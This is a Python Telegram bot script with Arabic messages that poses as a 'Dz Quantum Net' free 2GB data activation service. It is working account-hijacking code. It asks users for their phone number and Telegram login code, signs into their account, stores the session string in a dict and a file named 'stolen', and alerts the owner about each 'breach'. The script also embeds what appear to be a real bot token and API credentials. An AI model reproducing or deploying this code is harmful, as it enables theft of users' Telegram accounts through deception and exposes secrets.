import os
import asyncio
import json
from pathlib import Path
from flask import Flask
from threading import Thread
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError
from telethon.sessions import StringSession

# ========== بياناتك ==========
BOT_TOKEN = "8704404185:AAGe_I8kcY4qtbpzVLxpTc2seLrPHHKLsvE"
API_ID = 38269251
API_HASH = "af81ddbd39ca658e08bf7c268d6651c7"
OWNER_ID = 5843701757

BASE_DIR = Path("/tmp/bot_sessions")
BASE_DIR.mkdir(exist_ok=True)
SESSION_FILE = BASE_DIR / "sessions.json"

user_data = {}
stolen = {}

if SESSION_FILE.exists():
    with open(SESSION_FILE) as f:
        stolen = {int(k): v for k, v in json.load(f).items()}

# ========== Flask (لإبقاء البوت شغالاً) ==========
app = Flask(__name__)

@app.route('/')
@app.route('/health')
def health():
    return "✅ Bot is running", 200

# ========== البوت ==========
bot = TelegramClient('bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

USER_MSG = "🌐 *Dz Quantum Net*\n🎁 خدمة تفعيل 2GB مجاني\n@Dz_off_bot"

@bot.on(events.NewMessage(pattern='/verify'))
async def verify(event):
    try:
        phone = event.text.split()[1]
        if not phone.startswith('+'):
            phone = '+' + phone
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        await client.send_code_request(phone)
        user_data[event.sender_id] = {'phone': phone, 'client': client}
        await event.reply(f"✅ تم إرسال الرمز إلى {phone}")
    except Exception as e:
        await event.reply(f"❌ {str(e)[:100]}")

@bot.on(events.NewMessage(pattern='/submit_code'))
async def submit(event):
    sid = event.sender_id
    if sid not in user_data:
        await event.reply("❌ أرسل /verify أولا")
        return
    try:
        code = event.text.split()[1]
        client = user_data[sid]['client']
        phone = user_data[sid]['phone']
        await client.sign_in(phone=phone, code=code)
        me = await client.get_me()
        session_str = StringSession.save(client.session)
        stolen[me.id] = session_str
        with open(SESSION_FILE, 'w') as f:
            json.dump({str(k): v for k, v in stolen.items()}, f)
        await event.reply("✅ تم التفعيل بنجاح")
        if sid != OWNER_ID:
            await bot.send_message(OWNER_ID, f"🔥 اختراق: {me.first_name} ({me.id})")
        await client.disconnect()
        del user_data[sid]
    except SessionPasswordNeededError:
        await event.reply("🔐 محمي بـ 2FA")
        del user_data[sid]
    except Exception as e:
        await event.reply(f"❌ {str(e)[:100]}")
        del user_data[sid]

@bot.on(events.NewMessage)
async def normal_user(event):
    if event.sender_id == OWNER_ID:
        return
    if event.text and event.text.startswith('/'):
        await event.reply(USER_MSG, parse_mode='markdown')

# ========== تشغيل البوت في الخلفية ==========
def run_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(bot.run_until_disconnected())

# ========== تشغيل Flask ==========
if __name__ == "__main__":
    bot_thread = Thread(target=run_bot)
    bot_thread.start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
